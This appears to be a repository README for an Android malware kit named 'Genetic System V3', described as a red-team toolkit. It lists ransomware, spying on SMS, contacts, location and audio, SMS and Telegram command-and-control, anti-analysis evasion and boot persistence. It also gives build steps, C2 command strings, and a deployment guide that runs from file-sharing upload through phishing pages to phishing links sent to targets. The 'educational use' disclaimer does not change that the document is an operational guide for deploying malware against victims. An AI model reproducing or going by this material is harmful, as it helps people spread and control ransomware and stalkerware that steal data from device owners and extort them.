# ⚡ GENETIC SYSTEM V3 ⚡
### Android Security Testing Framework — Red Team Toolkit

> **⚠️ WARNING:** This tool is for educational and authorized testing purposes only. Unauthorized use is illegal. Use at your own risk.

---

## 📱 Overview

**Genetic System V3** is a modular Android application built with **Jetpack Compose** and **Kotlin**. It combines multiple red-team capabilities into a single, modern UI package.

### 🔥 Features

| Module | Description | Status |
|--------|-------------|--------|
| **Ransomware Engine** | AES-256 GCM encryption for files | ✅ |
| **Spy Engine** | SMS, contacts, location, audio recording | ✅ |
| **C2 Control** | SMS & Telegram command & control | ✅ |
| **Lock Screen** | Full-screen HTML overlay | ✅ |
| **Evasion** | Anti-emulator, anti-debug, anti-hook | ✅ |
| **Telegram Exfil** | Data exfiltration via Telegram Bot API | ✅ |
| **Persistence** | Auto-start on boot, background service | ✅ |

---

## 🖥️ UI Preview

**Built with Jetpack Compose:**
- Modern dark theme
- Smooth animations
- Chaos mode toggle
- Real-time status updates
- Gradient buttons & animated toggles

---

## 🚀 Quick Start

### Method 1: GitHub Actions (Easiest)

1. **Fork/Clone** this repository
2. Go to **Actions** tab
3. Select **"Build APK"** workflow
4. Click **"Run workflow"**
5. Fill parameters:
   - `apk_name`: Desired APK filename
   - `telegram_bot`: Bot token (optional)
   - `telegram_chat`: Chat ID (optional)
6. Wait 3-5 minutes
7. Download signed APK from **Artifacts**

### Method 2: Manual Build

```bash
git clone https://github.com/your-username/genetic-system-v3.git
cd genetic-system-v3
chmod +x gradlew
./gradlew assembleRelease
```

Output: app/build/outputs/apk/release/app-release.apk

Method 3: Install Directly

```bash
./gradlew installDebug
```

---

📁 Project Structure

```
genetic-system-v3/
├── app/
│   ├── build.gradle.kts
│   └── src/main/
│       ├── AndroidManifest.xml
│       └── java/com/genetic/system/v3/
│           ├── MainActivity.kt
│           ├── GeneticApplication.kt
│           ├── ui/
│           │   ├── screens/
│           │   │   ├── HomeScreen.kt
│           │   │   ├── RansomwareScreen.kt
│           │   │   ├── SpyScreen.kt
│           │   │   ├── C2Screen.kt
│           │   │   └── SettingsScreen.kt
│           │   ├── theme/
│           │   │   ├── Theme.kt
│           │   │   ├── Color.kt
│           │   │   └── Type.kt
│           │   └── components/
│           │       ├── GradientButton.kt
│           │       └── AnimatedToggle.kt
│           ├── engine/
│           │   ├── RansomwareEngine.kt
│           │   ├── SpyEngine.kt
│           │   ├── TelegramSender.kt
│           │   ├── BackgroundService.kt
│           │   └── BootReceiver.kt
│           ├── c2/
│           │   └── SMSCommandHandler.kt
│           └── utils/
│               ├── EncryptionUtils.kt
│               └── PermissionHelper.kt
├── .github/workflows/
│   └── build-apk.yml
├── build.gradle.kts
├── settings.gradle.kts
├── gradle.properties
├── proguard-rules.pro
└── .gitignore
```

---

🎮 Usage Guide

1. First Launch

· Grant all requested permissions
· Enable Chaos Mode (top-right lock icon) to unlock all features

2. Ransomware Module

· Tap "Ransomware" from home
· Click "🔒 Encrypt" to encrypt all files
· Click "🔓 Decrypt" to decrypt with stored key

3. Spy Module

· Tap "Spy Engine"
· Toggle switch to start monitoring
· Click "Collect All Data Now" for manual collection

4. C2 Control

· Send commands via SMS or Telegram
· Quick command chips for common operations

5. SMS Commands

```
GENETIC_CMD:ENCRYPT
GENETIC_CMD:DECRYPT:yourkey
GENETIC_CMD:COLLECT_SMS
GENETIC_CMD:START_LOCATION
GENETIC_CMD:CAPTURE_PHOTO
GENETIC_CMD:SELF_DESTRUCT
```

---

🔧 Requirements

Component Version
Android SDK 21+
Kotlin 1.9.20
Gradle 8.2+
JDK 17

---

🛡️ Permissions Required

```
- READ_SMS
- READ_CONTACTS
- ACCESS_FINE_LOCATION
- ACCESS_COARSE_LOCATION
- RECORD_AUDIO
- CAMERA
- READ_EXTERNAL_STORAGE
- WRITE_EXTERNAL_STORAGE
- READ_PHONE_STATE
- RECEIVE_BOOT_COMPLETED
- FOREGROUND_SERVICE
- SYSTEM_ALERT_WINDOW
- RECEIVE_SMS
- SEND_SMS
```

---

📤 Deployment Guide

1. Upload APK → catbox.moe, file.io, or gofile.io
2. Deploy phishing page → Netlify/Vercel
3. Send phishing link → SMS, WhatsApp, or email
4. Control via SMS → Send commands to target device

---

⚠️ Legal Notice

This software is intended for:

· ✅ Authorized penetration testing
· ✅ Security research on owned devices
· ✅ Educational purposes in controlled environments

YOU are responsible for complying with all applicable laws.

---

🛠️ Troubleshooting

Build fails?

```bash
./gradlew clean
./gradlew assembleRelease --stacktrace
```

APK won't install?

· Enable "Install from unknown sources"
· Check Android version (min 6.0)
· Ensure APK is signed

Telegram not working?

· Verify bot token and chat ID in gradle.properties
· Check internet connection

---

📝 Changelog

v3.0.0

· ✅ Full Jetpack Compose UI
· ✅ Dark theme with BIZZ styling
· ✅ Chaos mode toggle
· ✅ All engines integrated
· ✅ GitHub Actions CI/CD
· ✅ Proguard obfuscation

---

🏆 Credits

Built with: Kotlin, Jetpack Compose, Coroutines, OkHttp, Bouncy Castle

Powered by: Leonore

---

📞 Contact

For educational inquiries: [+6283114821208]

---

⭐ Star this repo if you find it useful!

Remember: With great power comes great responsibility. Use wisely.
